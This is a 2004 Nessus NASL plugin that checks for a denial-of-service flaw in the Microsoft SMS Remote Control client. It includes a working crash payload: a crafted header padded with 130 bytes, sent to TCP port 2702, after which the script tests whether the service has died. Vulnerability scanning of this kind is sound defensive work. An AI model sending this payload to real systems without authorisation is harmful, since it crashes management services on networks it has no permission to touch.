#
# Noam Rathaus
#
# Subject: Denial of Service (DoS) in Microsoft SMS Client
# From: vuln@hexview.com
# Date: 14.7.2004 21:45

if(description)
{
 script_id(13752);
 script_version("$Revision: 1.3 $");
 
 name["english"] = "Denial of Service (DoS) in Microsoft SMS Client";
 
 script_name(english:name["english"]);
 
 desc["english"] = "
Microsoft Systems Management Server provides configuration management
solution for Windows platform. It is widely deployed in medium and large
network environments. A flaw in SMS Remote Control service makes possible to
crash the service remotely leading to the DoS condition.

Affected products:
All tests were performed on a client part of Microsoft Systems Management
Server version 2.50.2726.0.

Risk factor : Medium";

 script_description(english:desc["english"]);
 
 summary["english"] = "Detect the vulnerability of SMS Client";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_DESTRUCTIVE_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2004 Noam Rathaus");
 family["english"] = "Denial of Service"; 

 script_family(english:family["english"]);
 script_require_ports(2702);
 exit(0);
}

debug = 0;

port = 2702;
if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 if(soc)
 {
  req = raw_string(0x52, 0x43, 0x48, 0x30, 0x16, 0x00, 0x40, 0x00, 0x52, 0x43, 0x48, 0x45);
  req = string(req, crap(data:raw_string(0x58), length:130));

  if (debug)
	{
   display("req: ", req, "\n");
	}
	
  send(socket:soc, data:req);
  sleep(1);

  close(soc);

	soc = open_sock_tcp(port);
	if (!soc)
	{
	 security_warning(port:port);
	}
 }
}

